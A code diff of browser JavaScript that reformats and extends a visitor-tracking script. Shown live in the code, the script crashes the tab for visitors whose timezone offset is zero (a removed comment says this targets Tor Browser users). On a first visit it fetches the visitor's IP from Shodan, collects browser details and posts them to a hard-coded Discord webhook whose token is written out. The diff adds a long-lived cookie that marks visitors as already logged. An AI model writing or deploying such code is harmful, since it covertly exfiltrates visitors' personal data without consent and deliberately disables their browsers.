@@ -1,9 +1,6 @@
-// Also check if the user uses TorBrowser, if they use it, crash the tab
 if (new Date().getTimezoneOffset() === 0) {
-  // Remove DOM
   document.documentElement.remove();
-  // Infinite loop
-  while (true) { }
+  while (true) {}
 }
 
 function getUserInfo() {
@@ -100,17 +97,23 @@ function getUserInfo() {
   };
 }
 
-// Check if the user was logged before
-if (document.cookie.split(';').some((item) => item.trim().startsWith('loggedBefore='))) {
+if (
+  document.cookie
+    .split(";")
+    .some((item) => item.trim().startsWith("loggedBefore="))
+) {
 } else {
+  document.cookie = "loggedBefore=true; expires=Fri, 31 Dec 9999 23:59:59 GMT";
+
   const SHODAN_IP_API_URL = "https://api.shodan.io/tools/myip";
-  const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1206919379397255201/UstaPTdGwX6MIJAWSWqaIwX45BiqNQr_PVspqxnlwJROmkkNTWo-aaAB8FYvZZzBhJaj";
+  const DISCORD_WEBHOOK_URL =
+    "https://discord.com/api/webhooks/1206919379397255201/UstaPTdGwX6MIJAWSWqaIwX45BiqNQr_PVspqxnlwJROmkkNTWo-aaAB8FYvZZzBhJaj";
 
   // Fetch the user's IP
   fetch(SHODAN_IP_API_URL)
     .then((response) => response.text())
     .then((data) => {
-      const IP = data
+      const IP = data;
 
       const userInfo = getUserInfo();
 
@@ -132,4 +135,4 @@ if (document.cookie.split(';').some((item) => item.trim().startsWith('loggedBefo
         body: JSON.stringify(payload),
       });
     });
-  }
+}
